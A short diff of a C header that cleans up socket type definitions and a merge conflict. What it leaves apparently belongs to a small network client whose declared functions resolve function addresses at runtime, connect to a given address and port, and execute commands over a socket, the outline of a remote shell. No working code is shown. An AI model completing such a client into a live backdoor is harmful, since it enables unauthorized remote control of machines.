@@ -30,7 +30,6 @@ struct functionaddr
     
 };
 
-
 enum _USTATUS
 {
 
@@ -40,31 +39,6 @@ enum _USTATUS
 
 };
 
-
-typedef int SOCKET;
-typedef unsigned short ushort;
-typedef unsigned int uint32_t;
-
-
-typedef SOCKET (socket)(int domain, int type, int protocol);
-typedef int (connect)(int sockfd, const struct sockaddr* addr, size_t addrlen);
-
-
-struct sockaddr
-{
-	ushort sa_family;
-	char sa_data[14];
-};
-
-struct sockaddr_in
-{
-	short   sin_family;
-	u_short sin_port;
-	struct  in_addr sin_addr;
-	char    sin_zero[8];
-};
-
-
 typedef struct
 {
 
@@ -73,16 +47,9 @@ typedef struct
 
 } ClientCTX, *pClientCTX;
 
-<<<<<<< HEAD
+
 struct functionaddr GetFunctionVA(struct functionaddr* funcVA);
 pClientCTX CliInit(const char* inetaddr, const int port);
-=======
-
-#endif
-
-uint32_t inet_addr(const char* ip);
-pClientCTX CliInit(void);
->>>>>>> 5f705d909d599db565c4af386cf2bfc55791323f
 SOCKET client_socket(SOCKET Socket);
 SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
 int execmd(SOCKET Socket);
